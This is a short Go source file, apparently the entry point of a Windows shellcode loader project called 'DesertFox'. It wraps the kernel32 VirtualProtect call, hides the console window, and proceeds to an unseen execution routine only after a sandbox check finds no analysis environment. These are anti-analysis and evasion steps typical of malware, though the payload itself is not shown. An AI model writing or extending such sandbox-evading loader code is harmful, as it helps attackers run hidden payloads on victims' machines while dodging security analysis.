package main

import (
	"fmt"
	"unsafe"
	"src/DesertFox/function"
	"syscall"
)

var (
	procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
	// RtlCopyMemory      = ntdll.MustFindProc("RtlCopyMemory")
)

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func main() {
	function.HideWindow()
	Sb := function.CheckSandbox()
	if len(Sb) == 0 {
		function.Proceed()
	} else {
		fmt.Println(Sb)
	}
}
